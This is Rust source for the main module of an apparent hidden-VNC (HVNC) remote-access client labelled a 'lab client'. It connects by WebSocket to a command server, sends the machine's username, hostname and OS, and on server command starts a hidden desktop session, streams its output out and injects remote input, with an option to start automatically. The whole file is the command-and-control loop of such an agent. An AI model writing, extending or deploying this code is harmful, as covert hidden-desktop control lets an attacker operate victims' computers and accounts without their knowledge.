mod hvnc;
mod socks;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use futures_util::{SinkExt, StreamExt};
use hvnc::HvncSession;
use serde::{Deserialize, Serialize};
use socks::{SocksOut, WakeSignal};
use tokio::time;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;
use uuid::Uuid;

static DEBUG: AtomicBool = AtomicBool::new(false);

#[macro_export]
macro_rules! dbg_print {
    ($($arg:tt)*) => {
        if $crate::debug_enabled() {
            eprintln!($($arg)*);
        }
    };
}

pub fn debug_enabled() -> bool {
    DEBUG.load(Ordering::Relaxed)
}

#[derive(Parser, Debug)]
#[command(author, version, about = "RustyVNC lab client")]
struct Args {
    #[arg(long, default_value = "ws://127.0.0.1:7070/ws/client")]
    server: String,

    #[arg(long)]
    token: Option<String>,

    #[arg(long)]
    client_id: Option<Uuid>,

    #[arg(long)]
    autostart: bool,

    #[arg(long, default_value_t = 70)]
    quality: u8,

    #[arg(long)]
    debug: bool,
}

#[derive(Debug, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum ServerCommand {
    Start { quality: Option<u8> },
    Stop,
    Ping,
}

#[derive(Debug, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum ClientEvent<'a> {
    Hello {
        client_id: Uuid,
        platform: &'a str,
        user: &'a str,
        host: &'a str,
    },
    Started {
        client_id: Uuid,
        conn_id: Uuid,
    },
    Stopped {
        client_id: Uuid,
    },
    Error {
        client_id: Uuid,
        message: String,
    },
    Pong {
        client_id: Uuid,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    DEBUG.store(args.debug, Ordering::Relaxed);

    let client_id = args.client_id.unwrap_or_else(Uuid::new_v4);
    let server = with_query(&args.server, client_id, args.token.as_deref());
    eprintln!("[*] RustyVNC client {}", client_id);
    eprintln!("[*] Server: {}", server);

    let (ws, _) = connect_async(&server)
        .await
        .with_context(|| format!("connect {}", server))?;
    let (mut writer, mut reader) = ws.split();
    let user = env_value("USERNAME")
        .or_else(|| env_value("USER"))
        .unwrap_or_default();
    let host = env_value("COMPUTERNAME")
        .or_else(|| env_value("HOSTNAME"))
        .unwrap_or_default();

    writer
        .send(Message::Text(serde_json::to_string(&ClientEvent::Hello {
            client_id,
            platform: std::env::consts::OS,
            user: &user,
            host: &host,
        })?))
        .await?;

    let outbound: Arc<Mutex<Vec<SocksOut>>> = Arc::new(Mutex::new(Vec::new()));
    let wake = WakeSignal::new().context("create wake signal")?;
    let mut hvnc: Option<HvncSession> = None;
    let mut drain = time::interval(Duration::from_millis(20));

    if args.autostart {
        match start_hvnc(
            &mut hvnc,
            outbound.clone(),
            wake.clone_ref(),
            client_id,
            args.quality,
        ) {
            Ok(conn_id) => {
                writer
                    .send(Message::Text(serde_json::to_string(
                        &ClientEvent::Started { client_id, conn_id },
                    )?))
                    .await?;
            }
            Err(message) => {
                writer
                    .send(Message::Text(serde_json::to_string(&ClientEvent::Error {
                        client_id,
                        message,
                    })?))
                    .await?;
            }
        }
    }

    loop {
        tokio::select! {
            _ = drain.tick() => {
                let items = drain_outbound(&outbound);
                for item in items {
                    let _ = (&item.conn_id, &item.agent_id, item.index, &item.job_id, &item.token);
                    if item.close {
                        writer
                            .send(Message::Text(serde_json::to_string(&ClientEvent::Stopped { client_id })?))
                            .await?;
                    } else if !item.data.is_empty() {
                        writer.send(Message::Binary(item.data)).await?;
                    }
                }
            }
            incoming = reader.next() => {
                let Some(incoming) = incoming else { break; };
                match incoming? {
                    Message::Text(text) => {
                        match serde_json::from_str::<ServerCommand>(&text) {
                            Ok(ServerCommand::Start { quality }) => {
                                match start_hvnc(&mut hvnc, outbound.clone(), wake.clone_ref(), client_id, quality.unwrap_or(args.quality)) {
                                    Ok(conn_id) => {
                                        writer
                                            .send(Message::Text(serde_json::to_string(&ClientEvent::Started { client_id, conn_id })?))
                                            .await?;
                                    }
                                    Err(message) => {
                                        writer
                                            .send(Message::Text(serde_json::to_string(&ClientEvent::Error { client_id, message })?))
                                            .await?;
                                    }
                                }
                            }
                            Ok(ServerCommand::Stop) => {
                                if let Some(session) = hvnc.take() {
                                    session.stop();
                                }
                                writer
                                    .send(Message::Text(serde_json::to_string(&ClientEvent::Stopped { client_id })?))
                                    .await?;
                            }
                            Ok(ServerCommand::Ping) => {
                                writer
                                    .send(Message::Text(serde_json::to_string(&ClientEvent::Pong { client_id })?))
                                    .await?;
                            }
                            Err(err) => {
                                writer
                                    .send(Message::Text(serde_json::to_string(&ClientEvent::Error {
                                        client_id,
                                        message: format!("invalid command: {}", err),
                                    })?))
                                    .await?;
                            }
                        }
                    }
                    Message::Binary(data) => {
                        if let Some(session) = hvnc.as_ref() {
                            session.handle_input(&data);
                        }
                    }
                    Message::Close(_) => break,
                    _ => {}
                }
            }
        }
    }

    if let Some(session) = hvnc.take() {
        session.stop();
    }

    Ok(())
}

fn start_hvnc(
    current: &mut Option<HvncSession>,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    client_id: Uuid,
    quality: u8,
) -> std::result::Result<Uuid, String> {
    if current.is_some() {
        return Err("HVNC already active".to_string());
    }
    let session = HvncSession::start(outbound, wake, client_id, quality)?;
    let conn_id = session.conn_id();
    *current = Some(session);
    Ok(conn_id)
}

fn drain_outbound(outbound: &Arc<Mutex<Vec<SocksOut>>>) -> Vec<SocksOut> {
    match outbound.lock() {
        Ok(mut queue) => queue.drain(..).collect(),
        Err(_) => Vec::new(),
    }
}

fn with_query(base: &str, client_id: Uuid, token: Option<&str>) -> String {
    let sep = if base.contains('?') { '&' } else { '?' };
    let mut url = format!("{}{}id={}", base, sep, client_id);
    if let Some(token) = token {
        url.push_str("&token=");
        url.push_str(token);
    }
    url
}

fn env_value(key: &str) -> Option<String> {
    std::env::var(key).ok().filter(|value| !value.is_empty())
}
